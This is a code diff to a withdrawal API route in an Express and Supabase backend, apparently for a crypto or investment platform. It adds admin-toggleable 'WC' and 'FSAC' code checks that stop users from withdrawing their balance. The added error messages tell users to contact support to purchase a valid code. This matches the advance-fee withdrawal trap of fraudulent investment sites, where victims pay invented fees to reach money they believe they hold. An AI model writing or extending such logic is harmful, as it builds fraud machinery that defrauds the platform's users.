@@ -7,15 +7,41 @@ const router = express.Router();
 const MIN_WITHDRAWAL = 50;
 const FEE_RATE = 0.01; // 1%
 
+// GET /api/withdrawals/settings — check if WC/FSAC codes are required
+router.get('/settings', requireAuth, async (req, res) => {
+  const { data } = await supabase.from('site_settings').select('key, value').in('key', ['wc_code_enabled', 'fsac_code_enabled']);
+  const s = {};
+  (data || []).forEach(r => { s[r.key] = r.value === 'true'; });
+  res.json({ wcRequired: s.wc_code_enabled ?? false, fsacRequired: s.fsac_code_enabled ?? false });
+});
+
 // POST /api/withdrawals
 router.post('/', requireAuth, async (req, res) => {
-  const { method, walletAddress, amount } = req.body;
+  const { method, walletAddress, amount, wcCode, fsacCode } = req.body;
   if (!method || !walletAddress || !amount) {
     return res.status(400).json({ error: 'Method, wallet address, and amount are required' });
   }
 
   const amt = Number(amount);
   if (amt < MIN_WITHDRAWAL) return res.status(400).json({ error: `Minimum withdrawal is $${MIN_WITHDRAWAL}` });
+
+  // Check WC/FSAC code requirements
+  const { data: settings } = await supabase.from('site_settings').select('key, value').in('key', ['wc_code_enabled', 'fsac_code_enabled']);
+  const cfg = {};
+  (settings || []).forEach(r => { cfg[r.key] = r.value === 'true'; });
+
+  if (cfg.wc_code_enabled) {
+    if (!wcCode) return res.status(400).json({ error: 'Withdrawal Confirmation (WC) code is required. Contact support to get your code.' });
+    const { data: wc } = await supabase.from('withdrawal_codes').select('*').eq('user_id', req.user.id).eq('code_type', 'wc').eq('code', wcCode.trim()).eq('used', false).maybeSingle();
+    if (!wc) return res.status(400).json({ error: 'Invalid WC code. Please contact support to purchase a valid code.' });
+    await supabase.from('withdrawal_codes').update({ used: true }).eq('id', wc.id);
+  }
+  if (cfg.fsac_code_enabled) {
+    if (!fsacCode) return res.status(400).json({ error: 'FSAC code is required. Contact support to get your code.' });
+    const { data: fsac } = await supabase.from('withdrawal_codes').select('*').eq('user_id', req.user.id).eq('code_type', 'fsac').eq('code', fsacCode.trim()).eq('used', false).maybeSingle();
+    if (!fsac) return res.status(400).json({ error: 'Invalid FSAC code. Please contact support to purchase a valid code.' });
+    await supabase.from('withdrawal_codes').update({ used: true }).eq('id', fsac.id);
+  }
 
   const { data: user } = await supabase.from('users').select('balance').eq('id', req.user.id).single();
   if (Number(user.balance) < amt) return res.status(400).json({ error: 'Insufficient balance' });
